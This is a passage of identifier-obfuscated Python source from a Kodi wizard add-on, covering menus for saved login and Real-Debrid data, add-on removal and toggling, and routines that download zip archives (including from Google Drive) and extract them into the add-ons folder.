	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2992
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2993
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2994
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2995
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2996
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2997
	setView ('files','viewType')#line:2998
def loginMenu ():#line:3000
	OOOO0OOO000O0O00O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3001
	O0OOOO00O0O0OO0OO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3002
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3003
	addFile ('Save Login Data: %s'%OOOO0OOO000O0O00O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3004
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OOOO00O0O0OO0OO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3005
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3006
	for OOOO0OOO000O0O00O in loginit .ORDER :#line:3008
		OOOO00O0000O0O0OO =LOGINID [OOOO0OOO000O0O00O ]['name']#line:3009
		OO000O00OOO0OOO0O =LOGINID [OOOO0OOO000O0O00O ]['path']#line:3010
		O0000OO00OO0OOO0O =LOGINID [OOOO0OOO000O0O00O ]['saved']#line:3011
		O0O0OO0000O0O0OO0 =LOGINID [OOOO0OOO000O0O00O ]['file']#line:3012
		O00O0O0O000OO0OOO =wiz .getS (O0000OO00OO0OOO0O )#line:3013
		OOOOOOOOOOO000000 =loginit .loginUser (OOOO0OOO000O0O00O )#line:3014
		O0OO0000O000OOOO0 =LOGINID [OOOO0OOO000O0O00O ]['icon']if os .path .exists (OO000O00OOO0OOO0O )else ICONLOGIN #line:3015
		O0OO0OO00O0O00O0O =LOGINID [OOOO0OOO000O0O00O ]['fanart']if os .path .exists (OO000O00OOO0OOO0O )else FANART #line:3016
		O0OO00OO00O0OOOOO =createMenu ('saveaddon','Login',OOOO0OOO000O0O00O )#line:3017
		O00OOOOOOO0OOO0O0 =createMenu ('save','Login',OOOO0OOO000O0O00O )#line:3018
		O0OO00OO00O0OOOOO .append ((THEME2 %'%s Settings'%OOOO00O0000O0O0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOOO0OOO000O0O00O )))#line:3019
		addFile ('[+]-> %s'%OOOO00O0000O0O0OO ,'',icon =O0OO0000O000OOOO0 ,fanart =O0OO0OO00O0O00O0O ,themeit =THEME3 )#line:3021
		if not os .path .exists (OO000O00OOO0OOO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO0000O000OOOO0 ,fanart =O0OO0OO00O0O00O0O ,menu =O0OO00OO00O0OOOOO )#line:3022
		elif not OOOOOOOOOOO000000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOOO0OOO000O0O00O ,icon =O0OO0000O000OOOO0 ,fanart =O0OO0OO00O0O00O0O ,menu =O0OO00OO00O0OOOOO )#line:3023
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOOOOOOOO000000 ,'authlogin',OOOO0OOO000O0O00O ,icon =O0OO0000O000OOOO0 ,fanart =O0OO0OO00O0O00O0O ,menu =O0OO00OO00O0OOOOO )#line:3024
		if O00O0O0O000OO0OOO =="":#line:3025
			if os .path .exists (O0O0OO0000O0O0OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOOO0OOO000O0O00O ,icon =O0OO0000O000OOOO0 ,fanart =O0OO0OO00O0O00O0O ,menu =O00OOOOOOO0OOO0O0 )#line:3026
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOOO0OOO000O0O00O ,icon =O0OO0000O000OOOO0 ,fanart =O0OO0OO00O0O00O0O ,menu =O00OOOOOOO0OOO0O0 )#line:3027
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0O0O000OO0OOO ,'',icon =O0OO0000O000OOOO0 ,fanart =O0OO0OO00O0O00O0O ,menu =O00OOOOOOO0OOO0O0 )#line:3028
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3030
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3031
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3032
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3033
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3034
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3035
	setView ('files','viewType')#line:3036
def fixUpdate ():#line:3038
	if KODIV <17 :#line:3039
		O0O0000OOOO0O0000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3040
		try :#line:3041
			os .remove (O0O0000OOOO0O0000 )#line:3042
		except Exception as OOO00OOO0O000OO00 :#line:3043
			wiz .log ("Unable to remove %s, Purging DB"%O0O0000OOOO0O0000 )#line:3044
			wiz .purgeDb (O0O0000OOOO0O0000 )#line:3045
	else :#line:3046
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3047
def removeAddonMenu ():#line:3049
	O00000OO0000000OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3050
	OO0O0O0O00OO00OOO =[];OO0OO0000O0O00O00 =[]#line:3051
	for O00000OOO0O000OO0 in sorted (O00000OO0000000OO ,key =lambda O0O00000000OO0O00 :O0O00000000OO0O00 ):#line:3052
		O0O0OO00O00OO000O =os .path .split (O00000OOO0O000OO0 [:-1 ])[1 ]#line:3053
		if O0O0OO00O00OO000O in EXCLUDES :continue #line:3054
		elif O0O0OO00O00OO000O in DEFAULTPLUGINS :continue #line:3055
		elif O0O0OO00O00OO000O =='packages':continue #line:3056
		OOOOO000O0O0OO0OO =os .path .join (O00000OOO0O000OO0 ,'addon.xml')#line:3057
		if os .path .exists (OOOOO000O0O0OO0OO ):#line:3058
			OOOOOOO000O0O0000 =open (OOOOO000O0O0OO0OO )#line:3059
			OOO00O0O000000000 =OOOOOOO000O0O0000 .read ()#line:3060
			OOOO0O0OOO0000OO0 =wiz .parseDOM (OOO00O0O000000000 ,'addon',ret ='id')#line:3061
			O00OOOOO0OOO00O0O =O0O0OO00O00OO000O if len (OOOO0O0OOO0000OO0 )==0 else OOOO0O0OOO0000OO0 [0 ]#line:3063
			try :#line:3064
				O0O0O00OOOO0O0OO0 =xbmcaddon .Addon (id =O00OOOOO0OOO00O0O )#line:3065
				OO0O0O0O00OO00OOO .append (O0O0O00OOOO0O0OO0 .getAddonInfo ('name'))#line:3066
				OO0OO0000O0O00O00 .append (O00OOOOO0OOO00O0O )#line:3067
			except :#line:3068
				pass #line:3069
	if len (OO0O0O0O00OO00OOO )==0 :#line:3070
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3071
		return #line:3072
	if KODIV >16 :#line:3073
		OOOOOOOO0OOO0000O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O0O0O00OO00OOO )#line:3074
	else :#line:3075
		OOOOOOOO0OOO0000O =[];O0O00O0OOOO0O0000 =0 #line:3076
		O0000O0000O0O0OOO =["-- Click here to Continue --"]+OO0O0O0O00OO00OOO #line:3077
		while not O0O00O0OOOO0O0000 ==-1 :#line:3078
			O0O00O0OOOO0O0000 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0000O0000O0O0OOO )#line:3079
			if O0O00O0OOOO0O0000 ==-1 :break #line:3080
			elif O0O00O0OOOO0O0000 ==0 :break #line:3081
			else :#line:3082
				OO0OO00OO0000O0O0 =(O0O00O0OOOO0O0000 -1 )#line:3083
				if OO0OO00OO0000O0O0 in OOOOOOOO0OOO0000O :#line:3084
					OOOOOOOO0OOO0000O .remove (OO0OO00OO0000O0O0 )#line:3085
					O0000O0000O0O0OOO [O0O00O0OOOO0O0000 ]=OO0O0O0O00OO00OOO [OO0OO00OO0000O0O0 ]#line:3086
				else :#line:3087
					OOOOOOOO0OOO0000O .append (OO0OO00OO0000O0O0 )#line:3088
					O0000O0000O0O0OOO [O0O00O0OOOO0O0000 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0O0O0O00OO00OOO [OO0OO00OO0000O0O0 ])#line:3089
	if OOOOOOOO0OOO0000O ==None :return #line:3090
	if len (OOOOOOOO0OOO0000O )>0 :#line:3091
		wiz .addonUpdates ('set')#line:3092
		for OOO00OOOO000O00O0 in OOOOOOOO0OOO0000O :#line:3093
			removeAddon (OO0OO0000O0O00O00 [OOO00OOOO000O00O0 ],OO0O0O0O00OO00OOO [OOO00OOOO000O00O0 ],True )#line:3094
		xbmc .sleep (1000 )#line:3096
		if INSTALLMETHOD ==1 :O0O0OOO000000OO0O =1 #line:3098
		elif INSTALLMETHOD ==2 :O0O0OOO000000OO0O =0 #line:3099
		else :O0O0OOO000000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3100
		if O0O0OOO000000OO0O ==1 :wiz .reloadFix ('remove addon')#line:3101
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3102
def removeAddonDataMenu ():#line:3104
	if os .path .exists (ADDOND ):#line:3105
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3106
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3107
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3108
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3109
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3110
		O0O00OO0000000000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3111
		for O0OOO0O0OO0OOO0OO in sorted (O0O00OO0000000000 ,key =lambda OO0000OO000O00000 :OO0000OO000O00000 ):#line:3112
			O0OO000OO000000OO =O0OOO0O0OO0OOO0OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3113
			O0O0000OOO0O00000 =os .path .join (O0OOO0O0OO0OOO0OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3114
			OOOOOOOO0OOO00O0O =os .path .join (O0OOO0O0OO0OOO0OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3115
			OO0O0OO00OO00OO0O =O0OO000OO000000OO #line:3116
			OOO000O0O0O000O0O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3117
			for OOO00OO00O0OOOOO0 in OOO000O0O0O000O0O :#line:3118
				OO0O0OO00OO00OO0O =OO0O0OO00OO00OO0O .replace (OOO00OO00O0OOOOO0 ,OOO000O0O0O000O0O [OOO00OO00O0OOOOO0 ])#line:3119
			if O0OO000OO000000OO in EXCLUDES :OO0O0OO00OO00OO0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO0O0OO00OO00OO0O #line:3120
			else :OO0O0OO00OO00OO0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO0O0OO00OO00OO0O #line:3121
			addFile (' %s'%OO0O0OO00OO00OO0O ,'removedata',O0OO000OO000000OO ,icon =O0O0000OOO0O00000 ,fanart =OOOOOOOO0OOO00O0O ,themeit =THEME2 )#line:3122
	else :#line:3123
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3124
	setView ('files','viewType')#line:3125
def enableAddons ():#line:3127
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3128
	O00OOOOOO00000000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3129
	O000OO000OOOO00OO =0 #line:3130
	for OO0OOO00000000O00 in sorted (O00OOOOOO00000000 ,key =lambda O0O00O0O00O0000O0 :O0O00O0O00O0000O0 ):#line:3131
		O0000O00O0O00OOOO =os .path .split (OO0OOO00000000O00 [:-1 ])[1 ]#line:3132
		if O0000O00O0O00OOOO in EXCLUDES :continue #line:3133
		if O0000O00O0O00OOOO in DEFAULTPLUGINS :continue #line:3134
		O00OO0000OO0OO0O0 =os .path .join (OO0OOO00000000O00 ,'addon.xml')#line:3135
		if os .path .exists (O00OO0000OO0OO0O0 ):#line:3136
			O000OO000OOOO00OO +=1 #line:3137
			O00OOOOOO00000000 =OO0OOO00000000O00 .replace (ADDONS ,'')[1 :-1 ]#line:3138
			O0OOO00O0O0000OOO =open (O00OO0000OO0OO0O0 )#line:3139
			OO00O00O0OO0OO000 =O0OOO00O0O0000OOO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3140
			O000O0OOOO0OO00OO =wiz .parseDOM (OO00O00O0OO0OO000 ,'addon',ret ='id')#line:3141
			O0O0OOO0OOOO000OO =wiz .parseDOM (OO00O00O0OO0OO000 ,'addon',ret ='name')#line:3142
			try :#line:3143
				O0OOO0OO000O00O0O =O000O0OOOO0OO00OO [0 ]#line:3144
				O00O0O0O0O0O000OO =O0O0OOO0OOOO000OO [0 ]#line:3145
			except :#line:3146
				continue #line:3147
			try :#line:3148
				O0OO0O00OO0OOO0OO =xbmcaddon .Addon (id =O0OOO0OO000O00O0O )#line:3149
				O0OOOO000O00O0O0O ="[COLOR green][Enabled][/COLOR]"#line:3150
				OOO0O00OOO00OO0O0 ="false"#line:3151
			except :#line:3152
				O0OOOO000O00O0O0O ="[COLOR red][Disabled][/COLOR]"#line:3153
				OOO0O00OOO00OO0O0 ="true"#line:3154
				pass #line:3155
			O000OOO00OO0OO0OO =os .path .join (OO0OOO00000000O00 ,'icon.png')if os .path .exists (os .path .join (OO0OOO00000000O00 ,'icon.png'))else ICON #line:3156
			O000OOOOO000OO00O =os .path .join (OO0OOO00000000O00 ,'fanart.jpg')if os .path .exists (os .path .join (OO0OOO00000000O00 ,'fanart.jpg'))else FANART #line:3157
			addFile ("%s %s"%(O0OOOO000O00O0O0O ,O00O0O0O0O0O000OO ),'toggleaddon',O00OOOOOO00000000 ,OOO0O00OOO00OO0O0 ,icon =O000OOO00OO0OO0OO ,fanart =O000OOOOO000OO00O )#line:3158
			O0OOO00O0O0000OOO .close ()#line:3159
	if O000OO000OOOO00OO ==0 :#line:3160
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3161
	setView ('files','viewType')#line:3162
def changeFeq ():#line:3164
	O0OO0OO0O00OO0000 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3165
	OOO000OOOO00OO000 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0OO0OO0O00OO0000 )#line:3166
	if not OOO000OOOO00OO000 ==-1 :#line:3167
		wiz .setS ('autocleanfeq',str (OOO000OOOO00OO000 ))#line:3168
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0OO0OO0O00OO0000 [OOO000OOOO00OO000 ]))#line:3169
def developer ():#line:3171
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3172
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3173
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3174
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3175
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3176
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3177
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3178
	setView ('files','viewType')#line:3180
def download (OO00OOO00O000OO00 ,OOOOO0O000O000OOO ):#line:3185
  OO0O00OO000000OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3186
  OOOO00OOOO000O0OO =xbmcgui .DialogProgress ()#line:3187
  OOOO00OOOO000O0OO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3188
  OO000OO00O000OOO0 =os .path .join (OO0O00OO000000OO0 ,'isr.zip')#line:3189
  OOOO0OOO0OO00OO00 =urllib2 .Request (OO00OOO00O000OO00 )#line:3190
  O000O00OO00OOO00O =urllib2 .urlopen (OOOO0OOO0OO00OO00 )#line:3191
  O0OOO00OO00O000OO =xbmcgui .DialogProgress ()#line:3193
  O0OOO00OO00O000OO .create ("Downloading","Downloading "+name )#line:3194
  O0OOO00OO00O000OO .update (0 )#line:3195
  O0OOO0O000O00000O =OOOOO0O000O000OOO #line:3196
  O0OOO0O0OOOOOOOO0 =open (OO000OO00O000OOO0 ,'wb')#line:3197
  try :#line:3199
    OOOO00O000O00OO0O =O000O00OO00OOO00O .info ().getheader ('Content-Length').strip ()#line:3200
    OO00OOO0O0OOOOOO0 =True #line:3201
  except AttributeError :#line:3202
        OO00OOO0O0OOOOOO0 =False #line:3203
  if OO00OOO0O0OOOOOO0 :#line:3205
        OOOO00O000O00OO0O =int (OOOO00O000O00OO0O )#line:3206
  OO0OO00OO000O00OO =0 #line:3208
  OO00O0OOOO0OO0000 =time .time ()#line:3209
  while True :#line:3210
        OOO0O00O000O00O00 =O000O00OO00OOO00O .read (8192 )#line:3211
        if not OOO0O00O000O00O00 :#line:3212
            sys .stdout .write ('\n')#line:3213
            break #line:3214
        OO0OO00OO000O00OO +=len (OOO0O00O000O00O00 )#line:3216
        O0OOO0O0OOOOOOOO0 .write (OOO0O00O000O00O00 )#line:3217
        if not OO00OOO0O0OOOOOO0 :#line:3219
            OOOO00O000O00OO0O =OO0OO00OO000O00OO #line:3220
        if O0OOO00OO00O000OO .iscanceled ():#line:3221
           O0OOO00OO00O000OO .close ()#line:3222
           try :#line:3223
            os .remove (OO000OO00O000OOO0 )#line:3224
           except :#line:3225
            pass #line:3226
           break #line:3227
        OOOO00OOOOOOOOO0O =float (OO0OO00OO000O00OO )/OOOO00O000O00OO0O #line:3228
        OOOO00OOOOOOOOO0O =round (OOOO00OOOOOOOOO0O *100 ,2 )#line:3229
        OO00O0OO0O0OOO000 =OO0OO00OO000O00OO /(1024 *1024 )#line:3230
        OOO0OO0O00O00OOOO =OOOO00O000O00OO0O /(1024 *1024 )#line:3231
        OO00O0O0OOO0OO0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O0OO0O0OOO000 ,'teal',OOO0OO0O00O00OOOO )#line:3232
        if (time .time ()-OO00O0OOOO0OO0000 )>0 :#line:3233
          O0OOOO0OO0O0000O0 =OO0OO00OO000O00OO /(time .time ()-OO00O0OOOO0OO0000 )#line:3234
          O0OOOO0OO0O0000O0 =O0OOOO0OO0O0000O0 /1024 #line:3235
        else :#line:3236
         O0OOOO0OO0O0000O0 =0 #line:3237
        O00000O00O0O000O0 ='KB'#line:3238
        if O0OOOO0OO0O0000O0 >=1024 :#line:3239
           O0OOOO0OO0O0000O0 =O0OOOO0OO0O0000O0 /1024 #line:3240
           O00000O00O0O000O0 ='MB'#line:3241
        if O0OOOO0OO0O0000O0 >0 and not OOOO00OOOOOOOOO0O ==100 :#line:3242
            O00OO00OO0OO000OO =(OOOO00O000O00OO0O -OO0OO00OO000O00OO )/O0OOOO0OO0O0000O0 #line:3243
        else :#line:3244
            O00OO00OO0OO000OO =0 #line:3245
        O0OOOO0O0O00OO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOO0OO0O0000O0 ,O00000O00O0O000O0 )#line:3246
        O0OOO00OO00O000OO .update (int (OOOO00OOOOOOOOO0O ),"Downloading "+name ,OO00O0O0OOO0OO0O0 ,O0OOOO0O0O00OO00O )#line:3248
  OOOOOO0000O0O0O00 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3251
  O0OOO0O0OOOOOOOO0 .close ()#line:3253
  extract (OO000OO00O000OOO0 ,OOOOOO0000O0O0O00 ,O0OOO00OO00O000OO )#line:3255
  if os .path .exists (OOOOOO0000O0O0O00 +'/scakemyer-script.quasar.burst'):#line:3256
    if os .path .exists (OOOOOO0000O0O0O00 +'/script.quasar.burst'):#line:3257
     shutil .rmtree (OOOOOO0000O0O0O00 +'/script.quasar.burst',ignore_errors =False )#line:3258
    os .rename (OOOOOO0000O0O0O00 +'/scakemyer-script.quasar.burst',OOOOOO0000O0O0O00 +'/script.quasar.burst')#line:3259
  if os .path .exists (OOOOOO0000O0O0O00 +'/plugin.video.kmediatorrent-master'):#line:3261
    if os .path .exists (OOOOOO0000O0O0O00 +'/plugin.video.kmediatorrent'):#line:3262
     shutil .rmtree (OOOOOO0000O0O0O00 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3263
    os .rename (OOOOOO0000O0O0O00 +'/plugin.video.kmediatorrent-master',OOOOOO0000O0O0O00 +'/plugin.video.kmediatorrent')#line:3264
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3265
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3266
  try :#line:3267
    os .remove (OO000OO00O000OOO0 )#line:3268
  except :#line:3269
    pass #line:3270
  O0OOO00OO00O000OO .close ()#line:3271
def dis_or_enable_addon (OO00OO0OOO000OOOO ,OOO000OOO0O0OO000 ,enable ="true"):#line:3272
    import json #line:3273
    O0O000O00O000O0O0 ='"%s"'%OO00OO0OOO000OOOO #line:3274
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO0OOO000OOOO )and enable =="true":#line:3275
        logging .warning ('already Enabled')#line:3276
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00OO0OOO000OOOO )#line:3277
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO0OOO000OOOO )and enable =="false":#line:3278
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00OO0OOO000OOOO )#line:3279
    else :#line:3280
        O0OOO0000OOO0OO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O000O00O000O0O0 ,enable )#line:3281
        O00O000000O0OOO00 =xbmc .executeJSONRPC (O0OOO0000OOO0OO0O )#line:3282
        OOO00O0OOOO0OO00O =json .loads (O00O000000O0OOO00 )#line:3283
        if enable =="true":#line:3284
            xbmc .log ("### Enabled %s, response = %s"%(OO00OO0OOO000OOOO ,OOO00O0OOOO0OO00O ))#line:3285
        else :#line:3286
            xbmc .log ("### Disabled %s, response = %s"%(OO00OO0OOO000OOOO ,OOO00O0OOOO0OO00O ))#line:3287
    if OOO000OOO0O0OO000 =='auto':#line:3288
     return True #line:3289
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3290
def chunk_report (OO0OOO00OOOOOO0OO ,O0O0OO0O0000OOOOO ,O000OO0O0O0O000OO ):#line:3291
   OO0O0OOO0OO0O0OOO =float (OO0OOO00OOOOOO0OO )/O000OO0O0O0O000OO #line:3292
   OO0O0OOO0OO0O0OOO =round (OO0O0OOO0OO0O0OOO *100 ,2 )#line:3293
   if OO0OOO00OOOOOO0OO >=O000OO0O0O0O000OO :#line:3295
      sys .stdout .write ('\n')#line:3296
def chunk_read (OOOO0000OO00O00O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3298
   import time #line:3299
   OOOOOO00OO00O00OO =int (filesize )*1000000 #line:3300
   OOO0O0000OO0OO0O0 =0 #line:3302
   OOOOOO00O0000OOOO =time .time ()#line:3303
   O0OOOOOO0O0O00000 =0 #line:3304
   logging .warning ('Downloading')#line:3306
   with open (destination ,"wb")as OOOO00O00O0OO0O0O :#line:3307
    while 1 :#line:3308
      OOO000000OO0O0O0O =time .time ()-OOOOOO00O0000OOOO #line:3309
      O0O000000OOOO000O =int (O0OOOOOO0O0O00000 *chunk_size )#line:3310
      O00000O00O000O0OO =OOOO0000OO00O00O0 .read (chunk_size )#line:3311
      OOOO00O00O0OO0O0O .write (O00000O00O000O0OO )#line:3312
      OOOO00O00O0OO0O0O .flush ()#line:3313
      OOO0O0000OO0OO0O0 +=len (O00000O00O000O0OO )#line:3314
      O0O0OOOO0O0O0O0O0 =float (OOO0O0000OO0OO0O0 )/OOOOOO00OO00O00OO #line:3315
      O0O0OOOO0O0O0O0O0 =round (O0O0OOOO0O0O0O0O0 *100 ,2 )#line:3316
      if int (OOO000000OO0O0O0O )>0 :#line:3317
        O00000O00O0O00O0O =int (O0O000000OOOO000O /(1024 *OOO000000OO0O0O0O ))#line:3318
      else :#line:3319
         O00000O00O0O00O0O =0 #line:3320
      if O00000O00O0O00O0O >1024 and not O0O0OOOO0O0O0O0O0 ==100 :#line:3321
          OOO00OOO0O00O00OO =int (((OOOOOO00OO00O00OO -O0O000000OOOO000O )/1024 )/(O00000O00O0O00O0O ))#line:3322
      else :#line:3323
          OOO00OOO0O00O00OO =0 #line:3324
      if OOO00OOO0O00O00OO <0 :#line:3325
        OOO00OOO0O00O00OO =0 #line:3326
      dp .update (int (O0O0OOOO0O0O0O0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0OOOO0O0O0O0O0 ,O0O000000OOOO000O /(1024 *1024 ),OOOOOO00OO00O00OO /(1000 *1000 ),O00000O00O0O00O0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO00OOO0O00O00OO ,60 ))#line:3327
      if dp .iscanceled ():#line:3328
         dp .close ()#line:3329
         break #line:3330
      if not O00000O00O000O0OO :#line:3331
         break #line:3332
      if report_hook :#line:3334
         report_hook (OOO0O0000OO0OO0O0 ,chunk_size ,OOOOOO00OO00O00OO )#line:3335
      O0OOOOOO0O0O00000 +=1 #line:3336
   logging .warning ('END Downloading')#line:3337
   return OOO0O0000OO0OO0O0 #line:3338
def googledrive_download (O0O0O0OO000OOOOOO ,OO000O00O0O0O000O ,OO0OO0O000OO00OO0 ,O00OO0OO0000OOOO0 ):#line:3340
    OO00O00O000OO0O0O =[]#line:3344
    OOO0O00OOOOO0OOOO =O0O0O0OO000OOOOOO .split ('=')#line:3345
    O0O0O0OO000OOOOOO =OOO0O00OOOOO0OOOO [len (OOO0O00OOOOO0OOOO )-1 ]#line:3346
    def O00OOO0OOOO0000O0 (OOOO0OOO0OOO0OO0O ):#line:3348
        for O0O00O00OO0OO000O in OOOO0OOO0OOO0OO0O :#line:3350
            logging .warning ('cookie.name')#line:3351
            logging .warning (O0O00O00OO0OO000O .name )#line:3352
            O0O0OO0OO0OOO0O0O =O0O00O00OO0OO000O .value #line:3353
            if 'download_warning'in O0O00O00OO0OO000O .name :#line:3354
                logging .warning (O0O00O00OO0OO000O .value )#line:3355
                logging .warning ('cookie.value')#line:3356
                return O0O00O00OO0OO000O .value #line:3357
            return O0O0OO0OO0OOO0O0O #line:3358
        return None #line:3360
    def O00OOOO0OOO00OOOO (OO00000O0OOO0OOO0 ,O0OOOOOOOOOOOO0O0 ):#line:3362
        O0OO0000O00O0OO00 =32768 #line:3364
        O00000OO00OO00O0O =time .time ()#line:3365
        with open (O0OOOOOOOOOOOO0O0 ,"wb")as O000O0O0O000OOOOO :#line:3367
            O0O0O00OOO0O0OO00 =1 #line:3368
            OO0000O000OO0OOO0 =32768 #line:3369
            try :#line:3370
                OOO00OOOOOO00OO00 =int (OO00000O0OOO0OOO0 .headers .get ('content-length'))#line:3371
                print ('file total size :',OOO00OOOOOO00OO00 )#line:3372
            except TypeError :#line:3373
                print ('using dummy length !!!')#line:3374
                OOO00OOOOOO00OO00 =int (O00OO0OO0000OOOO0 )*1000000 #line:3375
            for O0OOO0OOOOO0O0OO0 in OO00000O0OOO0OOO0 .iter_content (O0OO0000O00O0OO00 ):#line:3376
                if O0OOO0OOOOO0O0OO0 :#line:3377
                    O000O0O0O000OOOOO .write (O0OOO0OOOOO0O0OO0 )#line:3378
                    O000O0O0O000OOOOO .flush ()#line:3379
                    OOO0O00O00O0O0O00 =time .time ()-O00000OO00OO00O0O #line:3380
